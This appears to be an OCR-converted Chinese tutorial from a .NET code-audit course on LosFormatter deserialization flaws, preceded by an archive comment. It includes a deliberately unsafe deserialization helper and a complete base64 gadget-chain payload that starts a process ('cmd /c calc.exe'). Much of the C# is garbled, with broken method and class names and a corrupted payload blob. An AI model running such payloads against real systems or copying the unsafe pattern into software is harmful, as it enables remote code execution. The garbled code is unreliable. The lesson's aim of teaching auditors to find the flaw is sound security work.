<!--
Source: G:\tmp\安全项目研究\.netskill\.NET高级代码审计（第十一课） LosFormatter反序列化漏洞.pdf-e267cfed-7fee-4745-8d6f-d9f8a96a4e3d\full.md
Archived as: LosFormatter raw lesson material
Purpose: provenance-only reference for authorized .NET code audit skill development.
Do not load by default; prefer structured references unless exact source context is needed.
-->
.NET 高级代码审计（第十一课） LosFormatter 反序列化漏洞

Ivan1ee@360 天眼云影实验室

2019 年 03 月 01 日

# 0x00 前言

LosFormatter 一般也是用于序列化和反序列化 Web 窗体页的视图状态(ViewState)，如果要把 ViewState 通过数据库或其他持久化设备来维持，则需要采用特定的LosFormatter 类来序列化/反序列化。它封装在 System.Web.dll 中，位于命名空间System.Web.UI 下，微软官方的阐述是有限的对象序列化（LOS）格式专门为高度精简的 ASCII 格式序列化，此类支持序列化的任何对象图。但是使用反序列化不受信任的二进制文件会导致反序列化漏洞从而实现远程 RCE 攻击，本文笔者从原理和代码审计的视角做了相关介绍和复现。

# 0x01 LosFormatter 序列化

LosFormatter 类通常用于对 ViewState 页面状态视图的序列化，看下面实例来说明问题，首先定义 TestClass 对象

[Serializable]   
public class TestClass{ private string classname; private string name; private int age; public string classname { get $\Rightarrow$ classname; set $\Rightarrow$ classname $=$ value;} public string Name { get $\Rightarrow$ name; set $\Rightarrow$ name $=$ value;} public int Age { get $\Rightarrow$ age; set $\Rightarrow$ age $=$ value;} public override stringToString() { return base.ToString(); } public static void ClassMethod( string value) { Process.Start(value); }

定义了三个成员，并实现了一个静态方法 ClassMethod 启动进程。 序列化通过创建对

象实例分别给成员赋值

```txt
TestClass testClass = new TestClass();
testClass.Age = 18;
testClass.Name = "Ivan1ee";
testClass.Classname = "360";
FileStream stream = new FileStream(@"d:\los.dat", FileMode.Create);
LosFormatter bFormat = new LosFormatter();
bFormat SZerize(stream, testClass);
stream.Close(); 
```

常规下使用 Serialize 得到序列化后的文件内容是 Base64 编码的

```javascript
/wEypgEAAQAAAP///8BAAAAAAAAAawCAAAAPldwZkFwcDEsIFZIcnNpb249 MS4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1udWx sBQEAAAARV3BmQXBwMS5UZXN0Q2xhc3MDAAAACWNsYXNzbmFtZQRuY W1IA2FnZQEBAAgCAAAABgMAAAADMzYwBgQAAAAHSXZhbjFIZRIAAAAL 
```

# 0x02 LosFormatter 反序列化

# 2.1、反序列化用法

反序列过程是将Base64编码数据转换为对象，通过创建一个新对象的方式调用

Deserialize 方法实现的，查看定义如下

```cs
namespace System.Web.UI   
public sealed class LosFormatter   
public LosFormatter(); public LosFormatter(bool enableMac, string macKeyModifier); public LosFormatter(bool enableMac, byte[] macKeyModifier); public object Deserialization STREAM stream); public object Deserialization(TextReader input); public object Deserialization(string input); public void SZarize(Stream stream, object value); public void SZarize(TextWriter output, object value); } 
```

笔者通过创建新对象的方式调用 Deserialize 方法实现的具体实现代码可参考以下

```txt
FileStream stream2 = new FileInputStream(@"d:\los.dat", FileMode.Open);  
LosFormatter bFormat2 = new LosFormatter();  
var person = bFormat2.Deserialization(stream2);  
MessageBox.Show(((TestClass)person).Name);  
stream2.Close(); 
```

反序列化后得到 TestClass 类的成员 Name 的值。

![](images/2d089768b105e6fe8ad591ce626dbb22a963efbaeedf67db401976f5ddbddd9b.jpg)

# 2.2、攻击向量—ActivitySurrogateSelector

由于之前已经介绍了漏洞的原理，所以本篇就不再冗余的叙述，没有看的朋友请参考《.NET 高级代码审计（第八课） SoapFormatter 反序列化漏洞》，不同之处是用了LosFormatter 类序列化数据，同样也是通过重写 ISerializationSurrogate 调用自定义代码得到序列化后的数据

```html
VY5GKIEAAAAA/AAAAAAGAAAATGEX10XvYvCvLYB[OLU AUKNCBCD8W3O]PQF10xVyHvTfYBXvYvLVTzRVYvZyRZYJYZUHY2XUYRZYJYZUAY2XUYRZYJYZD5CXNYUuZv120ZXLEKfDfTYXQo197UXLmTEREpBYRNUUUYkUUYz9VY2DbSH3hVcXEVYUVGLKVDVgVZUHVUvCvYvGyLcVvYvCvLYBvLHTyCvLYbVcBBEDBXYrUVBLrYthxIc1BgBAABAAATAAEBXt9XNBZyRQyFSYTZXJYxpefEaeVySdyuYsFyBAAACAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA AAALNCHLhMgYxRyBz5b63x3YjOBQAABAAAABAAAABAAAABAAAABAAAABAAAABAAAABAAAABAAAABAAAABAAAABAAAABAAAABAAAABAAAABAAAABAAAABAAAABAAAABAAAABAAAABAAAABAAAABAAAABAAAABAAAABAAAABAAAABAAAABAAAABAAAABAAAABAAAABAAAABAAAABAAAABAAAABAAAABAAAABAAAABAAAABAAAABAAAABAAAABAAAABAAAABAAAABAAAABAAAABAAAABAAAABAAAABAAAABAAAABAAAABAAAABAAAABAAA 
```

按照惯例用 LosFormatter 类的 Deserialize 方法反序列化就可以成功触发计算器。

```javascript
FileStream stream2 = new FileInputStream(@"d:\loscalc.dat", FileMode.Open); LosFormatter bFormat2 = new LosFormatter(); var person = bFormat2.Deserialization(stream2); MessageBox.Show(((TestClass)person).Name); stream2.Close(); 
```

![](images/c5595b44674f16df53009df7a4443b5860186514c36655425dd632f1cc5f4982.jpg)

# 2.3、攻击向量—PSObject

由于笔者的 windows 主机打过了 CVE-2017-8565（Windows PowerShell 远程代码执行漏洞）的补丁，利用不成功，所以在这里不做深入探讨，有兴趣的朋友可以自行研究。有关于补丁的详细信息参考：

```txt
https://support.microsoft.com/zh-cn/help/4025872.windows-powershell-remote-code-execution-vulnerability 
```

# 2.4、攻击向量—MulticastDelegate

由于之前已经介绍了漏洞的原理，所以本篇就不再冗余的叙述，没有看的朋友请参考《.NET 高级代码审计（第七课）NetDataContractSerializer 反序列化漏洞》

# 0x03 代码审计视角

# 3.1、Deserialize

从代码审计的角度找到漏洞的 EntryPoint，Deserialize 有两个重载分别可反序列化Stream 和字符串数据，其中字符串可以是原始的 Raw 也可以是文档中说的 Base64 字符串，两者在实际的反序列化都可以成功。

# 方法

Deserialize(Stream)

将 Stream对象中包含的视图状态值转换为有限对象序列化 (LOS)格式的对象。

Deserialize(String)

将指定的视图状态值转换为有限对象序列化(LOS)格式的对象。

下面是不安全的代码：  
using System;   
using System.Collections.Generic;   
using System.IO;   
using System.Ling;   
using System.Routine.Serialization.Formatters(Binary);   
using System.Web;   
using System.Web.UI;   
using SystemXml;   
public class LosHelper { public static object Deserialization(string content) { LosFormatter losFormatter $\equiv$ new LosFormatter(); var objects $=$ losFormatter.Deserialization(content); return objects; }

攻击者只需要控制传入字符串参数 Content 便可轻松实现反序列化漏洞攻击，完整的

Poc 如下  
```javascript
/wEyxBEAAQAAAP////8BAAAAAAAAAawCAAAASVN5c3RlbSwgVmVyc2Ivbj00Lj AuMC4wLCBDdWx0dXJIPW5IdXRyYWwsIFB1YmxpY0tleVRva2VuPW13N2E1YzU2 MTkzNGUwODkFAQAAIAIQBU3IzdGVtLkNvbGxIY3Rpb25zLkdIbmVyaWMuU29y dGVkU2V0YDFbW1N5c3RlbS5TdHJpbmcslIG1zY29ybGliLCBWZXJzaW9uPTQuM C4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljs2V5VG9rZW49Yjc3YTVjNTY xOTM0ZTA4OV1dBAAAAAVDb3VudAhDb21wYXJlcdgWZXJzaW9uBU0ZW1zAA MABgiNAV5c3RlbS5Db2xsZWN0aW9ucy5HZW5IcmljLkNvbXBhcmlzb25Db21 wYXJlcmAxW1tTeXN0ZW0uU3RyaW5nLCBtc2NvcmxpYiwgVmVyc2Ivbj00LjAuM C4wLCBDdWx0dXJIPW5IdXRyYWwsIFB1YmxpY0tleVRva2VuPW13N2E1YzU2MTk 
```

zNGUwODldXQgCAAAAAgAAAAkDAAAAAgAAAAkEAAAABAMAAACNAVN5c3 RlbS5Db2xsZWN0aW9ucy5HZW5lcmljLkNvbXBhcmlzb25Db21wYXJlcmAxW1tTe XN0ZW0uU3RyaW5nLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dX JlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldXQEA AAALX2NvbXBhcmlzb24DIlN5c3RlbS5EZWxlZ2F0ZVNlcmlhbGl6YXRpb25Ib2xkZ XIJBQAAABEEAAAAAgAAAAYGAAAACy9jIGNhbGMuZXhlBgcAAAADY21kBAUA AAAiU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXphdGlvbkhvbGRlcgMAAAAIRGVsZWd hdGUHbWV0aG9kMAdtZXRob2QxAwMDMFN5c3RlbS5EZWxlZ2F0ZVNlcmlhbGl 6YXRpb25Ib2xkZXIrRGVsZWdhdGVFbnRyeS9TeXN0ZW0uUmVmbGVjdGlvbi5NZ W1iZXJJbmZvU2VyaWFsaXphdGlvbkhvbGRlci9TeXN0ZW0uUmVmbGVjdGlvbi5 NZW1iZXJJbmZvU2VyaWFsaXphdGlvbkhvbGRlcgkIAAAACQkAAAAJCgAAAAQI AAAAMFN5c3RlbS5EZWxlZ2F0ZVNlcmlhbGl6YXRpb25Ib2xkZXIrRGVsZWdhdGV FbnRyeQcAAAAEdHlwZQhhc3NlbWJseQZ0YXJnZXQSdGFyZ2V0VHlwZUFzc2VtY mx5DnRhcmdldFR5cGVOYW1lCm1ldGhvZE5hbWUNZGVsZWdhdGVFbnRyeQEB AgEBAQMwU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXphdGlvbkhvbGRlcitEZWxlZ2F0 ZUVudHJ5BgsAAACwAlN5c3RlbS5GdW5jYDNbW1N5c3RlbS5TdHJpbmcsIG1zY2 9ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGl jS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV0sW1N5c3RlbS5TdHJpbmcsIG1zY2 9ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGl jS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV0sW1N5c3RlbS5EaWFnbm9zdGljcy 5Qcm9jZXNzLCBTeXN0ZW0sIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV 0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0GDAAAAEtt c2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1Ym xpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODkKBg0AAABJU3lzdGVtLCBWZXJz aW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49 Yjc3YTVjNTYxOTM0ZTA4OQYOAAAAGlN5c3RlbS5EaWFnbm9zdGljcy5Qcm9jZX NzBg8AAAAFU3RhcnQJEAAAAAQJAAAAL1N5c3RlbS5SZWZsZWN0aW9uLk1lb WJlckluZm9TZXJpYWxpemF0aW9uSG9sZGVyBwAAAAROYW1lDEFzc2VtYmx5T mFtZQlDbGFzc05hbWUJU2lnbmF0dXJlClNpZ25hdHVyZTIKTWVtYmVyVHlwZRB HZW5lcmljQXJndW1lbnRzAQEBAQEAAwgNU3lzdGVtLlR5cGVbXQkPAAAACQ0A AAAJDgAAAAYUAAAAPlN5c3RlbS5EaWFnbm9zdGljcy5Qcm9jZXNzIFN0YXJ0KF N5c3RlbS5TdHJpbmcsIFN5c3RlbS5TdHJpbmcpBhUAAAA $^ +$ U3lzdGVtLkRpYWdub 3N0aWNzLlByb2Nlc3MgU3RhcnQoU3lzdGVtLlN0cmluZywgU3lzdGVtLlN0cmluZ ykIAAAACgEKAAAACQAAAAYWAAAAB0NvbXBhcmUJDAAAAAYYAAAADVN5c3 RlbS5TdHJpbmcGGQAAACtJbnQzMiBDb21wYXJlKFN5c3RlbS5TdHJpbmcsIFN5c

3RlbS5TdHJpbmcpBhoAAAAyU3lzdGVtLkludDMyIENvbXBhcmUoU3lzdGVtLlN0c mluZywgU3lzdGVtLlN0cmluZykIAAAACgEQAAAACAAAAAYbAAAAcVN5c3RlbS5 Db21wYXJpc29uYDFbW1N5c3RlbS5TdHJpbmcsIG1zY29ybGliLCBWZXJzaW9uPT QuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVj NTYxOTM0ZTA4OV1dCQwAAAAKCQwAAAAJGAAAAAkWAAAACgs=

# 最后附上动态图效果

![](images/b01962b39099bb5cd7042ea57ecf240076d883e618255e2ea8e26fa223fd338e.jpg)

# 0x04 总结

实际开发中 LosFormatter 通常用在处理 ViewState 状态视图，同

ObjectStateFormatter 一样在反序列化二进制文件时要注意数据本身的安全性，否则就会产生反序列化漏洞。最后.NET 反序列化系列课程笔者会同步到

https://github.com/Ivan1ee/ 、https://ivan1ee.gitbook.io/ ，更多的.NET 安全和技巧可关注笔者的 github。
